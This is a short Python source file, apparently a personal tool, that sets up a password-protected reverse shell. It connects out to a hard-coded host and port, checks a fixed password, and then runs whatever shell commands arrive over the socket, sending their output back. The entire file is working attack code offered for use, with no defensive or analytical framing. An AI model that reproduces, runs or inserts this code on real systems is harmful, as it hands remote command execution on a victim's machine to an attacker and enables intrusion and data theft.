# --------------------------------------------------------------------------------
# 30 June 2021 | 00 : 11 : 24 |
# src_ReverseShell.py: Responsible for establishing a reverse shell session.
# Prerequisite: SubProcess.
# --------------------------------------------------------------------------------

# Imports
import socket
import subprocess

# Constants
HOST = "192.168.0.105"
PORT = 443
BUFFER_SIZE = 4096
PASSWD = "0178e"

# Creating a socket instance
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((HOST, PORT))

# Function for authentication
def login():
    conn.send(b"\nLogin: ")
    pwd = conn.recv(BUFFER_SIZE).decode()
    
    if pwd.strip() != PASSWD:
        conn.send(b"\n" + b"[-] Incorrect Password. Try again..." + b"\n")
        login()
    else:
        conn.send(b"\n" + b"[+] Connected." + b"\n\n" + b"#rshell >" + b" ")
        rshell()

# Function for accepting commands
def rshell():
    while True:
        cmnd = conn.recv(BUFFER_SIZE).decode()

        # Defining quit action
        if cmnd.strip() == "quit":
            break

        proc = subprocess.Popen(cmnd, shell = True, stdout = subprocess.PIPE,
        stderr = subprocess.PIPE, stdin = subprocess.PIPE)

        output = proc.stdout.read() + proc.stderr.read()
        conn.send(b"\n" + output)
        conn.send(b"\n" + b"#rshell >" + b" ")

# Function call
login()